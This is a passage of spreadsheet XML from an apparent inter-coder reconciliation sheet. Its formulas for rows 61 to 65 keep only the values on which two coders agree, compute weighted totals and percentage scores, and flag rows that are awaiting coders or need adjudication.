        <f>IF(AND(Coder1!AA61&amp;""&lt;&gt;"",Coder1!AA61&amp;""=Coder2!AA61&amp;""),Coder1!AA61,"")</f>
        <v/>
      </c>
      <c r="AB61" s="14">
        <f>IF(AND(Coder1!AB61&amp;""&lt;&gt;"",Coder1!AB61&amp;""=Coder2!AB61&amp;""),Coder1!AB61,"")</f>
        <v/>
      </c>
      <c r="AC61" s="14">
        <f>IF(AND(Coder1!AC61&amp;""&lt;&gt;"",Coder1!AC61&amp;""=Coder2!AC61&amp;""),Coder1!AC61,"")</f>
        <v/>
      </c>
      <c r="AD61" s="14">
        <f>IF(AND(Coder1!AD61&amp;""&lt;&gt;"",Coder1!AD61&amp;""=Coder2!AD61&amp;""),Coder1!AD61,"")</f>
        <v/>
      </c>
      <c r="AE61" s="14">
        <f>IF(AND(Coder1!AE61&amp;""&lt;&gt;"",Coder1!AE61&amp;""=Coder2!AE61&amp;""),Coder1!AE61,"")</f>
        <v/>
      </c>
      <c r="AF61" s="14">
        <f>IF(AND(Coder1!AF61&amp;""&lt;&gt;"",Coder1!AF61&amp;""=Coder2!AF61&amp;""),Coder1!AF61,"")</f>
        <v/>
      </c>
      <c r="AG61" s="14">
        <f>IF(AND(Coder1!AG61&amp;""&lt;&gt;"",Coder1!AG61&amp;""=Coder2!AG61&amp;""),Coder1!AG61,"")</f>
        <v/>
      </c>
      <c r="AH61" s="14">
        <f>IF(AND(Coder1!AH61&amp;""&lt;&gt;"",Coder1!AH61&amp;""=Coder2!AH61&amp;""),Coder1!AH61,"")</f>
        <v/>
      </c>
      <c r="AI61" s="11">
        <f>IF(COUNT(E61:L61)=0,"",SUM(E61:L61))</f>
        <v/>
      </c>
      <c r="AJ61" s="11">
        <f>IF(AI61="","",N(E61)*3+N(F61)*2+N(G61)*2+N(H61)*2+N(I61)*2+N(J61)*3+N(K61)*3+N(L61)*3)</f>
        <v/>
      </c>
      <c r="AK61" s="11">
        <f>IF(AI61="","",COUNTIF(N61:AG61,1))</f>
        <v/>
      </c>
      <c r="AL61" s="11">
        <f>IF(OR(AJ61="",AJ61=0),"",ROUND(100*(AJ61-AK61)/AJ61,1))</f>
        <v/>
      </c>
      <c r="AM61" s="11">
        <f>IF(AND(Coder1!AN61=1,Coder2!AN61=1),IF(COUNTBLANK(E61:AH61)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN61" s="11">
        <f>IF(AND(Coder1!AN61=1,Coder2!AN61=1),IF(SUMPRODUCT(--(Coder1!E61:AH61&amp;""&lt;&gt;Coder2!E61:AH61&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO61" s="11" t="n"/>
    </row>
    <row r="62">
      <c r="A62" s="11">
        <f>Coder1!A62</f>
        <v/>
      </c>
      <c r="B62" s="11">
        <f>Coder1!B62</f>
        <v/>
      </c>
      <c r="C62" s="11">
        <f>Coder1!C62</f>
        <v/>
      </c>
      <c r="D62" s="11">
        <f>Coder1!D62</f>
        <v/>
      </c>
      <c r="E62" s="14">
        <f>IF(AND(Coder1!E62&amp;""&lt;&gt;"",Coder1!E62&amp;""=Coder2!E62&amp;""),Coder1!E62,"")</f>
        <v/>
      </c>
      <c r="F62" s="14">
        <f>IF(AND(Coder1!F62&amp;""&lt;&gt;"",Coder1!F62&amp;""=Coder2!F62&amp;""),Coder1!F62,"")</f>
        <v/>
      </c>
      <c r="G62" s="14">
        <f>IF(AND(Coder1!G62&amp;""&lt;&gt;"",Coder1!G62&amp;""=Coder2!G62&amp;""),Coder1!G62,"")</f>
        <v/>
      </c>
      <c r="H62" s="14">
        <f>IF(AND(Coder1!H62&amp;""&lt;&gt;"",Coder1!H62&amp;""=Coder2!H62&amp;""),Coder1!H62,"")</f>
        <v/>
      </c>
      <c r="I62" s="14">
        <f>IF(AND(Coder1!I62&amp;""&lt;&gt;"",Coder1!I62&amp;""=Coder2!I62&amp;""),Coder1!I62,"")</f>
        <v/>
      </c>
      <c r="J62" s="14">
        <f>IF(AND(Coder1!J62&amp;""&lt;&gt;"",Coder1!J62&amp;""=Coder2!J62&amp;""),Coder1!J62,"")</f>
        <v/>
      </c>
      <c r="K62" s="14">
        <f>IF(AND(Coder1!K62&amp;""&lt;&gt;"",Coder1!K62&amp;""=Coder2!K62&amp;""),Coder1!K62,"")</f>
        <v/>
      </c>
      <c r="L62" s="14">
        <f>IF(AND(Coder1!L62&amp;""&lt;&gt;"",Coder1!L62&amp;""=Coder2!L62&amp;""),Coder1!L62,"")</f>
        <v/>
      </c>
      <c r="M62" s="14">
        <f>IF(AND(Coder1!M62&amp;""&lt;&gt;"",Coder1!M62&amp;""=Coder2!M62&amp;""),Coder1!M62,"")</f>
        <v/>
      </c>
      <c r="N62" s="14">
        <f>IF(AND(Coder1!N62&amp;""&lt;&gt;"",Coder1!N62&amp;""=Coder2!N62&amp;""),Coder1!N62,"")</f>
        <v/>
      </c>
      <c r="O62" s="14">
        <f>IF(AND(Coder1!O62&amp;""&lt;&gt;"",Coder1!O62&amp;""=Coder2!O62&amp;""),Coder1!O62,"")</f>
        <v/>
      </c>
      <c r="P62" s="14">
        <f>IF(AND(Coder1!P62&amp;""&lt;&gt;"",Coder1!P62&amp;""=Coder2!P62&amp;""),Coder1!P62,"")</f>
        <v/>
      </c>
      <c r="Q62" s="14">
        <f>IF(AND(Coder1!Q62&amp;""&lt;&gt;"",Coder1!Q62&amp;""=Coder2!Q62&amp;""),Coder1!Q62,"")</f>
        <v/>
      </c>
      <c r="R62" s="14">
        <f>IF(AND(Coder1!R62&amp;""&lt;&gt;"",Coder1!R62&amp;""=Coder2!R62&amp;""),Coder1!R62,"")</f>
        <v/>
      </c>
      <c r="S62" s="14">
        <f>IF(AND(Coder1!S62&amp;""&lt;&gt;"",Coder1!S62&amp;""=Coder2!S62&amp;""),Coder1!S62,"")</f>
        <v/>
      </c>
      <c r="T62" s="14">
        <f>IF(AND(Coder1!T62&amp;""&lt;&gt;"",Coder1!T62&amp;""=Coder2!T62&amp;""),Coder1!T62,"")</f>
        <v/>
      </c>
      <c r="U62" s="14">
        <f>IF(AND(Coder1!U62&amp;""&lt;&gt;"",Coder1!U62&amp;""=Coder2!U62&amp;""),Coder1!U62,"")</f>
        <v/>
      </c>
      <c r="V62" s="14">
        <f>IF(AND(Coder1!V62&amp;""&lt;&gt;"",Coder1!V62&amp;""=Coder2!V62&amp;""),Coder1!V62,"")</f>
        <v/>
      </c>
      <c r="W62" s="14">
        <f>IF(AND(Coder1!W62&amp;""&lt;&gt;"",Coder1!W62&amp;""=Coder2!W62&amp;""),Coder1!W62,"")</f>
        <v/>
      </c>
      <c r="X62" s="14">
        <f>IF(AND(Coder1!X62&amp;""&lt;&gt;"",Coder1!X62&amp;""=Coder2!X62&amp;""),Coder1!X62,"")</f>
        <v/>
      </c>
      <c r="Y62" s="14">
        <f>IF(AND(Coder1!Y62&amp;""&lt;&gt;"",Coder1!Y62&amp;""=Coder2!Y62&amp;""),Coder1!Y62,"")</f>
        <v/>
      </c>
      <c r="Z62" s="14">
        <f>IF(AND(Coder1!Z62&amp;""&lt;&gt;"",Coder1!Z62&amp;""=Coder2!Z62&amp;""),Coder1!Z62,"")</f>
        <v/>
      </c>
      <c r="AA62" s="14">
        <f>IF(AND(Coder1!AA62&amp;""&lt;&gt;"",Coder1!AA62&amp;""=Coder2!AA62&amp;""),Coder1!AA62,"")</f>
        <v/>
      </c>
      <c r="AB62" s="14">
        <f>IF(AND(Coder1!AB62&amp;""&lt;&gt;"",Coder1!AB62&amp;""=Coder2!AB62&amp;""),Coder1!AB62,"")</f>
        <v/>
      </c>
      <c r="AC62" s="14">
        <f>IF(AND(Coder1!AC62&amp;""&lt;&gt;"",Coder1!AC62&amp;""=Coder2!AC62&amp;""),Coder1!AC62,"")</f>
        <v/>
      </c>
      <c r="AD62" s="14">
        <f>IF(AND(Coder1!AD62&amp;""&lt;&gt;"",Coder1!AD62&amp;""=Coder2!AD62&amp;""),Coder1!AD62,"")</f>
        <v/>
      </c>
      <c r="AE62" s="14">
        <f>IF(AND(Coder1!AE62&amp;""&lt;&gt;"",Coder1!AE62&amp;""=Coder2!AE62&amp;""),Coder1!AE62,"")</f>
        <v/>
      </c>
      <c r="AF62" s="14">
        <f>IF(AND(Coder1!AF62&amp;""&lt;&gt;"",Coder1!AF62&amp;""=Coder2!AF62&amp;""),Coder1!AF62,"")</f>
        <v/>
      </c>
      <c r="AG62" s="14">
        <f>IF(AND(Coder1!AG62&amp;""&lt;&gt;"",Coder1!AG62&amp;""=Coder2!AG62&amp;""),Coder1!AG62,"")</f>
        <v/>
      </c>
      <c r="AH62" s="14">
        <f>IF(AND(Coder1!AH62&amp;""&lt;&gt;"",Coder1!AH62&amp;""=Coder2!AH62&amp;""),Coder1!AH62,"")</f>
        <v/>
      </c>
      <c r="AI62" s="11">
        <f>IF(COUNT(E62:L62)=0,"",SUM(E62:L62))</f>
        <v/>
      </c>
      <c r="AJ62" s="11">
        <f>IF(AI62="","",N(E62)*3+N(F62)*2+N(G62)*2+N(H62)*2+N(I62)*2+N(J62)*3+N(K62)*3+N(L62)*3)</f>
        <v/>
      </c>
      <c r="AK62" s="11">
        <f>IF(AI62="","",COUNTIF(N62:AG62,1))</f>
        <v/>
      </c>
      <c r="AL62" s="11">
        <f>IF(OR(AJ62="",AJ62=0),"",ROUND(100*(AJ62-AK62)/AJ62,1))</f>
        <v/>
      </c>
      <c r="AM62" s="11">
        <f>IF(AND(Coder1!AN62=1,Coder2!AN62=1),IF(COUNTBLANK(E62:AH62)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN62" s="11">
        <f>IF(AND(Coder1!AN62=1,Coder2!AN62=1),IF(SUMPRODUCT(--(Coder1!E62:AH62&amp;""&lt;&gt;Coder2!E62:AH62&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO62" s="11" t="n"/>
    </row>
    <row r="63">
      <c r="A63" s="11">
        <f>Coder1!A63</f>
        <v/>
      </c>
      <c r="B63" s="11">
        <f>Coder1!B63</f>
        <v/>
      </c>
      <c r="C63" s="11">
        <f>Coder1!C63</f>
        <v/>
      </c>
      <c r="D63" s="11">
        <f>Coder1!D63</f>
        <v/>
      </c>
      <c r="E63" s="14">
        <f>IF(AND(Coder1!E63&amp;""&lt;&gt;"",Coder1!E63&amp;""=Coder2!E63&amp;""),Coder1!E63,"")</f>
        <v/>
      </c>
      <c r="F63" s="14">
        <f>IF(AND(Coder1!F63&amp;""&lt;&gt;"",Coder1!F63&amp;""=Coder2!F63&amp;""),Coder1!F63,"")</f>
        <v/>
      </c>
      <c r="G63" s="14">
        <f>IF(AND(Coder1!G63&amp;""&lt;&gt;"",Coder1!G63&amp;""=Coder2!G63&amp;""),Coder1!G63,"")</f>
        <v/>
      </c>
      <c r="H63" s="14">
        <f>IF(AND(Coder1!H63&amp;""&lt;&gt;"",Coder1!H63&amp;""=Coder2!H63&amp;""),Coder1!H63,"")</f>
        <v/>
      </c>
      <c r="I63" s="14">
        <f>IF(AND(Coder1!I63&amp;""&lt;&gt;"",Coder1!I63&amp;""=Coder2!I63&amp;""),Coder1!I63,"")</f>
        <v/>
      </c>
      <c r="J63" s="14">
        <f>IF(AND(Coder1!J63&amp;""&lt;&gt;"",Coder1!J63&amp;""=Coder2!J63&amp;""),Coder1!J63,"")</f>
        <v/>
      </c>
      <c r="K63" s="14">
        <f>IF(AND(Coder1!K63&amp;""&lt;&gt;"",Coder1!K63&amp;""=Coder2!K63&amp;""),Coder1!K63,"")</f>
        <v/>
      </c>
      <c r="L63" s="14">
        <f>IF(AND(Coder1!L63&amp;""&lt;&gt;"",Coder1!L63&amp;""=Coder2!L63&amp;""),Coder1!L63,"")</f>
        <v/>
      </c>
      <c r="M63" s="14">
        <f>IF(AND(Coder1!M63&amp;""&lt;&gt;"",Coder1!M63&amp;""=Coder2!M63&amp;""),Coder1!M63,"")</f>
        <v/>
      </c>
      <c r="N63" s="14">
        <f>IF(AND(Coder1!N63&amp;""&lt;&gt;"",Coder1!N63&amp;""=Coder2!N63&amp;""),Coder1!N63,"")</f>
        <v/>
      </c>
      <c r="O63" s="14">
        <f>IF(AND(Coder1!O63&amp;""&lt;&gt;"",Coder1!O63&amp;""=Coder2!O63&amp;""),Coder1!O63,"")</f>
        <v/>
      </c>
      <c r="P63" s="14">
        <f>IF(AND(Coder1!P63&amp;""&lt;&gt;"",Coder1!P63&amp;""=Coder2!P63&amp;""),Coder1!P63,"")</f>
        <v/>
      </c>
      <c r="Q63" s="14">
        <f>IF(AND(Coder1!Q63&amp;""&lt;&gt;"",Coder1!Q63&amp;""=Coder2!Q63&amp;""),Coder1!Q63,"")</f>
        <v/>
      </c>
      <c r="R63" s="14">
        <f>IF(AND(Coder1!R63&amp;""&lt;&gt;"",Coder1!R63&amp;""=Coder2!R63&amp;""),Coder1!R63,"")</f>
        <v/>
      </c>
      <c r="S63" s="14">
        <f>IF(AND(Coder1!S63&amp;""&lt;&gt;"",Coder1!S63&amp;""=Coder2!S63&amp;""),Coder1!S63,"")</f>
        <v/>
      </c>
      <c r="T63" s="14">
        <f>IF(AND(Coder1!T63&amp;""&lt;&gt;"",Coder1!T63&amp;""=Coder2!T63&amp;""),Coder1!T63,"")</f>
        <v/>
      </c>
      <c r="U63" s="14">
        <f>IF(AND(Coder1!U63&amp;""&lt;&gt;"",Coder1!U63&amp;""=Coder2!U63&amp;""),Coder1!U63,"")</f>
        <v/>
      </c>
      <c r="V63" s="14">
        <f>IF(AND(Coder1!V63&amp;""&lt;&gt;"",Coder1!V63&amp;""=Coder2!V63&amp;""),Coder1!V63,"")</f>
        <v/>
      </c>
      <c r="W63" s="14">
        <f>IF(AND(Coder1!W63&amp;""&lt;&gt;"",Coder1!W63&amp;""=Coder2!W63&amp;""),Coder1!W63,"")</f>
        <v/>
      </c>
      <c r="X63" s="14">
        <f>IF(AND(Coder1!X63&amp;""&lt;&gt;"",Coder1!X63&amp;""=Coder2!X63&amp;""),Coder1!X63,"")</f>
        <v/>
      </c>
      <c r="Y63" s="14">
        <f>IF(AND(Coder1!Y63&amp;""&lt;&gt;"",Coder1!Y63&amp;""=Coder2!Y63&amp;""),Coder1!Y63,"")</f>
        <v/>
      </c>
      <c r="Z63" s="14">
        <f>IF(AND(Coder1!Z63&amp;""&lt;&gt;"",Coder1!Z63&amp;""=Coder2!Z63&amp;""),Coder1!Z63,"")</f>
        <v/>
      </c>
      <c r="AA63" s="14">
        <f>IF(AND(Coder1!AA63&amp;""&lt;&gt;"",Coder1!AA63&amp;""=Coder2!AA63&amp;""),Coder1!AA63,"")</f>
        <v/>
      </c>
      <c r="AB63" s="14">
        <f>IF(AND(Coder1!AB63&amp;""&lt;&gt;"",Coder1!AB63&amp;""=Coder2!AB63&amp;""),Coder1!AB63,"")</f>
        <v/>
      </c>
      <c r="AC63" s="14">
        <f>IF(AND(Coder1!AC63&amp;""&lt;&gt;"",Coder1!AC63&amp;""=Coder2!AC63&amp;""),Coder1!AC63,"")</f>
        <v/>
      </c>
      <c r="AD63" s="14">
        <f>IF(AND(Coder1!AD63&amp;""&lt;&gt;"",Coder1!AD63&amp;""=Coder2!AD63&amp;""),Coder1!AD63,"")</f>
        <v/>
      </c>
      <c r="AE63" s="14">
        <f>IF(AND(Coder1!AE63&amp;""&lt;&gt;"",Coder1!AE63&amp;""=Coder2!AE63&amp;""),Coder1!AE63,"")</f>
        <v/>
      </c>
      <c r="AF63" s="14">
        <f>IF(AND(Coder1!AF63&amp;""&lt;&gt;"",Coder1!AF63&amp;""=Coder2!AF63&amp;""),Coder1!AF63,"")</f>
        <v/>
      </c>
      <c r="AG63" s="14">
        <f>IF(AND(Coder1!AG63&amp;""&lt;&gt;"",Coder1!AG63&amp;""=Coder2!AG63&amp;""),Coder1!AG63,"")</f>
        <v/>
      </c>
      <c r="AH63" s="14">
        <f>IF(AND(Coder1!AH63&amp;""&lt;&gt;"",Coder1!AH63&amp;""=Coder2!AH63&amp;""),Coder1!AH63,"")</f>
        <v/>
      </c>
      <c r="AI63" s="11">
        <f>IF(COUNT(E63:L63)=0,"",SUM(E63:L63))</f>
        <v/>
      </c>
      <c r="AJ63" s="11">
        <f>IF(AI63="","",N(E63)*3+N(F63)*2+N(G63)*2+N(H63)*2+N(I63)*2+N(J63)*3+N(K63)*3+N(L63)*3)</f>
        <v/>
      </c>
      <c r="AK63" s="11">
        <f>IF(AI63="","",COUNTIF(N63:AG63,1))</f>
        <v/>
      </c>
      <c r="AL63" s="11">
        <f>IF(OR(AJ63="",AJ63=0),"",ROUND(100*(AJ63-AK63)/AJ63,1))</f>
        <v/>
      </c>
      <c r="AM63" s="11">
        <f>IF(AND(Coder1!AN63=1,Coder2!AN63=1),IF(COUNTBLANK(E63:AH63)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN63" s="11">
        <f>IF(AND(Coder1!AN63=1,Coder2!AN63=1),IF(SUMPRODUCT(--(Coder1!E63:AH63&amp;""&lt;&gt;Coder2!E63:AH63&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO63" s="11" t="n"/>
    </row>
    <row r="64">
      <c r="A64" s="11">
        <f>Coder1!A64</f>
        <v/>
      </c>
      <c r="B64" s="11">
        <f>Coder1!B64</f>
        <v/>
      </c>
      <c r="C64" s="11">
        <f>Coder1!C64</f>
        <v/>
      </c>
      <c r="D64" s="11">
        <f>Coder1!D64</f>
        <v/>
      </c>
      <c r="E64" s="14">
        <f>IF(AND(Coder1!E64&amp;""&lt;&gt;"",Coder1!E64&amp;""=Coder2!E64&amp;""),Coder1!E64,"")</f>
        <v/>
      </c>
      <c r="F64" s="14">
        <f>IF(AND(Coder1!F64&amp;""&lt;&gt;"",Coder1!F64&amp;""=Coder2!F64&amp;""),Coder1!F64,"")</f>
        <v/>
      </c>
      <c r="G64" s="14">
        <f>IF(AND(Coder1!G64&amp;""&lt;&gt;"",Coder1!G64&amp;""=Coder2!G64&amp;""),Coder1!G64,"")</f>
        <v/>
      </c>
      <c r="H64" s="14">
        <f>IF(AND(Coder1!H64&amp;""&lt;&gt;"",Coder1!H64&amp;""=Coder2!H64&amp;""),Coder1!H64,"")</f>
        <v/>
      </c>
      <c r="I64" s="14">
        <f>IF(AND(Coder1!I64&amp;""&lt;&gt;"",Coder1!I64&amp;""=Coder2!I64&amp;""),Coder1!I64,"")</f>
        <v/>
      </c>
      <c r="J64" s="14">
        <f>IF(AND(Coder1!J64&amp;""&lt;&gt;"",Coder1!J64&amp;""=Coder2!J64&amp;""),Coder1!J64,"")</f>
        <v/>
      </c>
      <c r="K64" s="14">
        <f>IF(AND(Coder1!K64&amp;""&lt;&gt;"",Coder1!K64&amp;""=Coder2!K64&amp;""),Coder1!K64,"")</f>
        <v/>
      </c>
      <c r="L64" s="14">
        <f>IF(AND(Coder1!L64&amp;""&lt;&gt;"",Coder1!L64&amp;""=Coder2!L64&amp;""),Coder1!L64,"")</f>
        <v/>
      </c>
      <c r="M64" s="14">
        <f>IF(AND(Coder1!M64&amp;""&lt;&gt;"",Coder1!M64&amp;""=Coder2!M64&amp;""),Coder1!M64,"")</f>
        <v/>
      </c>
      <c r="N64" s="14">
        <f>IF(AND(Coder1!N64&amp;""&lt;&gt;"",Coder1!N64&amp;""=Coder2!N64&amp;""),Coder1!N64,"")</f>
        <v/>
      </c>
      <c r="O64" s="14">
        <f>IF(AND(Coder1!O64&amp;""&lt;&gt;"",Coder1!O64&amp;""=Coder2!O64&amp;""),Coder1!O64,"")</f>
        <v/>
      </c>
      <c r="P64" s="14">
        <f>IF(AND(Coder1!P64&amp;""&lt;&gt;"",Coder1!P64&amp;""=Coder2!P64&amp;""),Coder1!P64,"")</f>
        <v/>
      </c>
      <c r="Q64" s="14">
        <f>IF(AND(Coder1!Q64&amp;""&lt;&gt;"",Coder1!Q64&amp;""=Coder2!Q64&amp;""),Coder1!Q64,"")</f>
        <v/>
      </c>
      <c r="R64" s="14">
        <f>IF(AND(Coder1!R64&amp;""&lt;&gt;"",Coder1!R64&amp;""=Coder2!R64&amp;""),Coder1!R64,"")</f>
        <v/>
      </c>
      <c r="S64" s="14">
        <f>IF(AND(Coder1!S64&amp;""&lt;&gt;"",Coder1!S64&amp;""=Coder2!S64&amp;""),Coder1!S64,"")</f>
        <v/>
      </c>
      <c r="T64" s="14">
        <f>IF(AND(Coder1!T64&amp;""&lt;&gt;"",Coder1!T64&amp;""=Coder2!T64&amp;""),Coder1!T64,"")</f>
        <v/>
      </c>
      <c r="U64" s="14">
        <f>IF(AND(Coder1!U64&amp;""&lt;&gt;"",Coder1!U64&amp;""=Coder2!U64&amp;""),Coder1!U64,"")</f>
        <v/>
      </c>
      <c r="V64" s="14">
        <f>IF(AND(Coder1!V64&amp;""&lt;&gt;"",Coder1!V64&amp;""=Coder2!V64&amp;""),Coder1!V64,"")</f>
        <v/>
      </c>
      <c r="W64" s="14">
        <f>IF(AND(Coder1!W64&amp;""&lt;&gt;"",Coder1!W64&amp;""=Coder2!W64&amp;""),Coder1!W64,"")</f>
        <v/>
      </c>
      <c r="X64" s="14">
        <f>IF(AND(Coder1!X64&amp;""&lt;&gt;"",Coder1!X64&amp;""=Coder2!X64&amp;""),Coder1!X64,"")</f>
        <v/>
      </c>
      <c r="Y64" s="14">
        <f>IF(AND(Coder1!Y64&amp;""&lt;&gt;"",Coder1!Y64&amp;""=Coder2!Y64&amp;""),Coder1!Y64,"")</f>
        <v/>
      </c>
      <c r="Z64" s="14">
        <f>IF(AND(Coder1!Z64&amp;""&lt;&gt;"",Coder1!Z64&amp;""=Coder2!Z64&amp;""),Coder1!Z64,"")</f>
        <v/>
      </c>
      <c r="AA64" s="14">
        <f>IF(AND(Coder1!AA64&amp;""&lt;&gt;"",Coder1!AA64&amp;""=Coder2!AA64&amp;""),Coder1!AA64,"")</f>
        <v/>
      </c>
      <c r="AB64" s="14">
        <f>IF(AND(Coder1!AB64&amp;""&lt;&gt;"",Coder1!AB64&amp;""=Coder2!AB64&amp;""),Coder1!AB64,"")</f>
        <v/>
      </c>
      <c r="AC64" s="14">
        <f>IF(AND(Coder1!AC64&amp;""&lt;&gt;"",Coder1!AC64&amp;""=Coder2!AC64&amp;""),Coder1!AC64,"")</f>
        <v/>
      </c>
      <c r="AD64" s="14">
        <f>IF(AND(Coder1!AD64&amp;""&lt;&gt;"",Coder1!AD64&amp;""=Coder2!AD64&amp;""),Coder1!AD64,"")</f>
        <v/>
      </c>
      <c r="AE64" s="14">
        <f>IF(AND(Coder1!AE64&amp;""&lt;&gt;"",Coder1!AE64&amp;""=Coder2!AE64&amp;""),Coder1!AE64,"")</f>
        <v/>
      </c>
      <c r="AF64" s="14">
        <f>IF(AND(Coder1!AF64&amp;""&lt;&gt;"",Coder1!AF64&amp;""=Coder2!AF64&amp;""),Coder1!AF64,"")</f>
        <v/>
      </c>
      <c r="AG64" s="14">
        <f>IF(AND(Coder1!AG64&amp;""&lt;&gt;"",Coder1!AG64&amp;""=Coder2!AG64&amp;""),Coder1!AG64,"")</f>
        <v/>
      </c>
      <c r="AH64" s="14">
        <f>IF(AND(Coder1!AH64&amp;""&lt;&gt;"",Coder1!AH64&amp;""=Coder2!AH64&amp;""),Coder1!AH64,"")</f>
        <v/>
      </c>
      <c r="AI64" s="11">
        <f>IF(COUNT(E64:L64)=0,"",SUM(E64:L64))</f>
        <v/>
      </c>
      <c r="AJ64" s="11">
        <f>IF(AI64="","",N(E64)*3+N(F64)*2+N(G64)*2+N(H64)*2+N(I64)*2+N(J64)*3+N(K64)*3+N(L64)*3)</f>
        <v/>
      </c>
      <c r="AK64" s="11">
        <f>IF(AI64="","",COUNTIF(N64:AG64,1))</f>
        <v/>
      </c>
      <c r="AL64" s="11">
        <f>IF(OR(AJ64="",AJ64=0),"",ROUND(100*(AJ64-AK64)/AJ64,1))</f>
        <v/>
      </c>
      <c r="AM64" s="11">
        <f>IF(AND(Coder1!AN64=1,Coder2!AN64=1),IF(COUNTBLANK(E64:AH64)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN64" s="11">
        <f>IF(AND(Coder1!AN64=1,Coder2!AN64=1),IF(SUMPRODUCT(--(Coder1!E64:AH64&amp;""&lt;&gt;Coder2!E64:AH64&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO64" s="11" t="n"/>
    </row>
    <row r="65">
      <c r="A65" s="11">
        <f>Coder1!A65</f>
        <v/>
      </c>
      <c r="B65" s="11">
        <f>Coder1!B65</f>
        <v/>
      </c>
      <c r="C65" s="11">
        <f>Coder1!C65</f>
        <v/>
      </c>
      <c r="D65" s="11">
        <f>Coder1!D65</f>
        <v/>
      </c>
      <c r="E65" s="14">
        <f>IF(AND(Coder1!E65&amp;""&lt;&gt;"",Coder1!E65&amp;""=Coder2!E65&amp;""),Coder1!E65,"")</f>
        <v/>
      </c>
      <c r="F65" s="14">
        <f>IF(AND(Coder1!F65&amp;""&lt;&gt;"",Coder1!F65&amp;""=Coder2!F65&amp;""),Coder1!F65,"")</f>
        <v/>
      </c>
      <c r="G65" s="14">
        <f>IF(AND(Coder1!G65&amp;""&lt;&gt;"",Coder1!G65&amp;""=Coder2!G65&amp;""),Coder1!G65,"")</f>
        <v/>
      </c>
      <c r="H65" s="14">
        <f>IF(AND(Coder1!H65&amp;""&lt;&gt;"",Coder1!H65&amp;""=Coder2!H65&amp;""),Coder1!H65,"")</f>
        <v/>
      </c>
      <c r="I65" s="14">
        <f>IF(AND(Coder1!I65&amp;""&lt;&gt;"",Coder1!I65&amp;""=Coder2!I65&amp;""),Coder1!I65,"")</f>
        <v/>
      </c>
      <c r="J65" s="14">
        <f>IF(AND(Coder1!J65&amp;""&lt;&gt;"",Coder1!J65&amp;""=Coder2!J65&amp;""),Coder1!J65,"")</f>
        <v/>
      </c>
      <c r="K65" s="14">
        <f>IF(AND(Coder1!K65&amp;""&lt;&gt;"",Coder1!K65&amp;""=Coder2!K65&amp;""),Coder1!K65,"")</f>
        <v/>
      </c>
      <c r="L65" s="14">
        <f>IF(AND(Coder1!L65&amp;""&lt;&gt;"",Coder1!L65&amp;""=Coder2!L65&amp;""),Coder1!L65,"")</f>
        <v/>
      </c>
      <c r="M65" s="14">
        <f>IF(AND(Coder1!M65&amp;""&lt;&gt;"",Coder1!M65&amp;""=Coder2!M65&amp;""),Coder1!M65,"")</f>
        <v/>
      </c>
      <c r="N65" s="14">
        <f>IF(AND(Coder1!N65&amp;""&lt;&gt;"",Coder1!N65&amp;""=Coder2!N65&amp;""),Coder1!N65,"")</f>
        <v/>
      </c>
      <c r="O65" s="14">
        <f>IF(AND(Coder1!O65&amp;""&lt;&gt;"",Coder1!O65&amp;""=Coder2!O65&amp;""),Coder1!O65,"")</f>
        <v/>
      </c>
      <c r="P65" s="14">
        <f>IF(AND(Coder1!P65&amp;""&lt;&gt;"",Coder1!P65&amp;""=Coder2!P65&amp;""),Coder1!P65,"")</f>
        <v/>
      </c>
      <c r="Q65" s="14">
        <f>IF(AND(Coder1!Q65&amp;""&lt;&gt;"",Coder1!Q65&amp;""=Coder2!Q65&amp;""),Coder1!Q65,"")</f>
        <v/>
      </c>
      <c r="R65" s="14">
        <f>IF(AND(Coder1!R65&amp;""&lt;&gt;"",Coder1!R65&amp;""=Coder2!R65&amp;""),Coder1!R65,"")</f>
        <v/>
      </c>
      <c r="S65" s="14">
        <f>IF(AND(Coder1!S65&amp;""&lt;&gt;"",Coder1!S65&amp;""=Coder2!S65&amp;""),Coder1!S65,"")</f>
        <v/>
      </c>
      <c r="T65" s="14">
        <f>IF(AND(Coder1!T65&amp;""&lt;&gt;"",Coder1!T65&amp;""=Coder2!T65&amp;""),Coder1!T65,"")</f>
        <v/>
      </c>
      <c r="U65" s="14">
        <f>IF(AND(Coder1!U65&amp;""&lt;&gt;"",Coder1!U65&amp;""=Coder2!U65&amp;""),Coder1!U65,"")</f>
        <v/>
      </c>
      <c r="V65" s="14">
        <f>IF(AND(Coder1!V65&amp;""&lt;&gt;"",Coder1!V65&amp;""=Coder2!V65&amp;""),Coder1!V65,"")</f>
        <v/>
      </c>
      <c r="W65" s="14">
        <f>IF(AND(Coder1!W65&amp;""&lt;&gt;"",Coder1!W65&amp;""=Coder2!W65&amp;""),Coder1!W65,"")</f>
        <v/>
      </c>
      <c r="X65" s="14">
        <f>IF(AND(Coder1!X65&amp;""&lt;&gt;"",Coder1!X65&amp;""=Coder2!X65&amp;""),Coder1!X65,"")</f>
        <v/>
      </c>
      <c r="Y65" s="14">
        <f>IF(AND(Coder1!Y65&amp;""&lt;&gt;"",Coder1!Y65&amp;""=Coder2!Y65&amp;""),Coder1!Y65,"")</f>
        <v/>
      </c>
      <c r="Z65" s="14">
        <f>IF(AND(Coder1!Z65&amp;""&lt;&gt;"",Coder1!Z65&amp;""=Coder2!Z65&amp;""),Coder1!Z65,"")</f>
        <v/>
      </c>
      <c r="AA65" s="14">
        <f>IF(AND(Coder1!AA65&amp;""&lt;&gt;"",Coder1!AA65&amp;""=Coder2!AA65&amp;""),Coder1!AA65,"")</f>
        <v/>
      </c>
      <c r="AB65" s="14">
        <f>IF(AND(Coder1!AB65&amp;""&lt;&gt;"",Coder1!AB65&amp;""=Coder2!AB65&amp;""),Coder1!AB65,"")</f>
        <v/>
      </c>
      <c r="AC65" s="14">
        <f>IF(AND(Coder1!AC65&amp;""&lt;&gt;"",Coder1!AC65&amp;""=Coder2!AC65&amp;""),Coder1!AC65,"")</f>
        <v/>
      </c>
      <c r="AD65" s="14">
